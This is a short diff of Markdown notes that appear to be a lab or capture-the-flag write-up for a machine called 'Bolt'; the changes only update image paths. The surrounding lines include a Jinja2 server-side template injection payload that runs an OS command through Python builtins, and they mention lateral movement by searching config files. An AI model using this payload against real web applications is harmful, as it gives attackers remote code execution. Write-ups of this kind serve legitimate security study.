@@ -140,9 +140,9 @@ def confirm_changes(token):
 
     return render_template('index.html')
 ```
-![[SSTI.png]]
+![[Medium/Unix/Bolt/SSTI.png]]
 - RCE payload: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
-![[SSTI test.png]]
+![[Medium/Unix/Bolt/SSTI test.png]]
 - we can inject a RCE with `SSTI`
 #### Lateral Movement (If any)
 - searching through different config files 
